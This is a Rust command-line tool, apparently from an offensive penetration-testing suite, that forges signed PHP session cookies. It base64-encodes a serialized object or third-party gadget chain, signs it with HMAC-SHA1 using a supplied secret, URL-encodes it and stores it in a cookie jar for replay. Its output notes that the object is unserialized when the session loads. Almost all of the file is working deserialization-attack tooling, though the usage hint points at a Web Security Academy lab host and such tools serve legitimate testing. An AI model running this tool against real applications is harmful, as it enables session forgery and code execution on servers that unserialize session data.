#!/usr/bin/env rust-script
//! name: php_sess_forge
//! description: 签名型 PHP 会话 cookie 铸造件 - 把序列化负载(第三方 gadget chain 或手写对象)做 base64 后用 HMAC-SHA1 以密钥签名,组装成 {"token","sig_hmac_sha1"} 的 JSON cookie 值并按 PHP urlencode 规则编码;--jar 直接写进 jar(host -> cookie 名 -> 值)供 http_dump/http_session/objref_scan 复用,--verify 对抓到的实现 cookie 复算签名以确认签名覆盖的是 base64 串还是原始字节。
//! version: 1.0.0
//! args: (--payload FILE | --inline STR | --b64 TOKEN) --secret S [--cookie-name session] [--host HOST] [--jar FILE] [--out FILE] [--verify SIG] [--selftest]
//! keywords: 漏洞猎手套件, 武器库, 渗透测试, php, deserialization, gadget-chain, hmac, sha1, 签名cookie, session-forge, phpggc
//!
//! ```cargo
//! [dependencies]
//! base64 = "0.22"
//! hmac = "0.12"
//! sha1 = "0.10"
//! ```
use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use hmac::{Hmac, Mac};
use pi_rust_lib::serde_json::{json, Map, Value};
use sha1::Sha1;

type HmacSha1 = Hmac<Sha1>;

fn hmac_sha1_hex(key: &[u8], data: &[u8]) -> String {
    let mut mac = HmacSha1::new_from_slice(key).expect("hmac accepts any key length");
    mac.update(data);
    mac.finalize()
        .into_bytes()
        .iter()
        .map(|b| format!("{:02x}", b))
        .collect()
}

fn percent_encode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' => out.push(b as char),
            b' ' => out.push('+'),
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

fn update_jar(path: &str, host: &str, name: &str, value: &str) -> Result<(), String> {
    let mut root: Map<String, Value> = match std::fs::read_to_string(path) {
        Ok(text) if !text.trim().is_empty() => match pi_rust_lib::serde_json::from_str(&text) {
            Ok(Value::Object(map)) => map,
            _ => return Err(format!("{} is not a JSON object", path)),
        },
        _ => Map::new(),
    };
    let entry = root
        .entry(host.to_string())
        .or_insert_with(|| Value::Object(Map::new()));
    if !entry.is_object() {
        *entry = Value::Object(Map::new());
    }
    entry
        .as_object_mut()
        .expect("entry is an object")
        .insert(name.to_string(), Value::String(value.to_string()));
    let text = pi_rust_lib::serde_json::to_string(&Value::Object(root)).map_err(|e| e.to_string())?;
    std::fs::write(path, text).map_err(|e| format!("cannot write {}: {}", path, e))
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut payload_file = String::new();
    let mut inline = String::new();
    let mut b64_in = String::new();
    let mut secret = String::new();
    let mut cookie_name = String::from("session");
    let mut host = String::new();
    let mut jar = String::new();
    let mut out = String::new();
    let mut verify = String::new();
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--payload" => { i += 1; payload_file = args.get(i).cloned().unwrap_or_default(); }
            "--inline" => { i += 1; inline = args.get(i).cloned().unwrap_or_default(); }
            "--b64" => { i += 1; b64_in = args.get(i).cloned().unwrap_or_default(); }
            "--secret" => { i += 1; secret = args.get(i).cloned().unwrap_or_default(); }
            "--cookie-name" => { i += 1; cookie_name = args.get(i).cloned().unwrap_or_else(|| String::from("session")); }
            "--host" => { i += 1; host = args.get(i).cloned().unwrap_or_default(); }
            "--jar" => { i += 1; jar = args.get(i).cloned().unwrap_or_default(); }
            "--out" => { i += 1; out = args.get(i).cloned().unwrap_or_default(); }
            "--verify" => { i += 1; verify = args.get(i).cloned().unwrap_or_default(); }
            _ => {}
        }
        i += 1;
    }
    if secret.is_empty() {
        pi_rust_lib::report::failure(
            "php_sess_forge",
            "missing --secret",
            "usage: php_sess_forge (--payload FILE | --inline STR | --b64 TOKEN) --secret S [--cookie-name session] [--host HOST] [--jar FILE] [--out FILE] [--verify SIG]",
        );
        std::process::exit(2);
    }
    if !jar.is_empty() && host.is_empty() {
        pi_rust_lib::report::failure(
            "php_sess_forge",
            "--jar requires --host",
            "usage: ... --host 0a000000000000000000000000000000.web-security-academy.net --jar /tmp/cj.json",
        );
        std::process::exit(2);
    }
    let (token, payload_bytes): (String, Option<usize>) = if !b64_in.is_empty() {
        (b64_in.clone(), None)
    } else if !payload_file.is_empty() {
        match std::fs::read(&payload_file) {
            Ok(bytes) => (STANDARD.encode(&bytes), Some(bytes.len())),
            Err(e) => {
                pi_rust_lib::report::failure(
                    "php_sess_forge",
                    &format!("cannot read {}: {}", payload_file, e),
                    "check --payload path",
                );
                std::process::exit(2);
            }
        }
    } else if !inline.is_empty() {
        (STANDARD.encode(inline.as_bytes()), Some(inline.len()))
    } else {
        pi_rust_lib::report::failure(
            "php_sess_forge",
            "missing payload",
            "usage: php_sess_forge (--payload FILE | --inline STR | --b64 TOKEN) --secret S ...",
        );
        std::process::exit(2);
    };

    let sig = hmac_sha1_hex(secret.as_bytes(), token.as_bytes());
    let value_raw = format!("{{\"token\":\"{}\",\"sig_hmac_sha1\":\"{}\"}}", token, sig);
    let cookie_value = percent_encode(&value_raw);

    let verify_field = if verify.is_empty() {
        Value::Null
    } else {
        json!({ "expected": verify, "match": verify.eq_ignore_ascii_case(&sig) })
    };
    let jar_field = if jar.is_empty() {
        Value::Null
    } else {
        match update_jar(&jar, &host, &cookie_name, &cookie_value) {
            Ok(()) => json!(jar),
            Err(e) => {
                pi_rust_lib::report::failure("php_sess_forge", &e, "check the jar path");
                std::process::exit(2);
            }
        }
    };
    if !out.is_empty() {
        if let Err(e) = std::fs::write(&out, &cookie_value) {
            pi_rust_lib::report::failure(
                "php_sess_forge",
                &format!("cannot write {}: {}", out, e),
                "check --out path",
            );
            std::process::exit(2);
        }
    }

    let data = json!({
        "token": token,
        "sig_hmac_sha1": sig,
        "cookie_value": cookie_value,
        "cookie_name": cookie_name,
        "host": if host.is_empty() { Value::Null } else { json!(host) },
        "jar": jar_field,
        "out": if out.is_empty() { Value::Null } else { json!(out) },
        "payload_bytes": payload_bytes.map_or(Value::Null, |n| json!(n)),
        "verify": verify_field,
    });
    let next = if jar.is_empty() {
        "send it as `Cookie: <cookie-name>=<cookie_value>` or rerun with --host/--jar to store it in a jar"
    } else {
        "replay any page of that host through http_dump/http_session with --jar; the signed object is unserialized on session load"
    };
    pi_rust_lib::report::success("php_sess_forge", data, next).expect("report");
}

fn selftest() {
    // RFC 2202 HMAC-SHA1 test case 1.
    assert_eq!(
        hmac_sha1_hex(&[0x0bu8; 20], b"Hi There"),
        "b617318655057264e28bc0b6fb378c8ef146be00"
    );
    assert_eq!(STANDARD.encode(b"O:4:\"User\";"), "Tzo0OiJVc2VyIjs=");
    assert_eq!(
        percent_encode("{\"a\":\"b+c/d=\"}"),
        "%7B%22a%22%3A%22b%2Bc%2Fd%3D%22%7D"
    );
    assert_eq!(percent_encode("a b~c"), "a+b%7Ec");
    // jar write/read round trip.
    let path = std::env::temp_dir().join("php_sess_forge_selftest.json");
    let p = path.to_string_lossy().to_string();
    let _ = std::fs::remove_file(&p);
    update_jar(&p, "host.example", "session", "VALUE%3D").expect("jar write");
    update_jar(&p, "other.example", "session", "OTHER").expect("jar write 2");
    let text = std::fs::read_to_string(&p).expect("jar read");
    assert!(text.contains("\"host.example\":{\"session\":\"VALUE%3D\"}"), "{}", text);
    assert!(text.contains("\"other.example\""), "{}", text);
    let _ = std::fs::remove_file(&p);
    println!("{{\"action\":\"php_sess_forge\",\"data\":{{\"selftest\":\"ok\",\"assertions\":5}},\"success\":true}}");
}
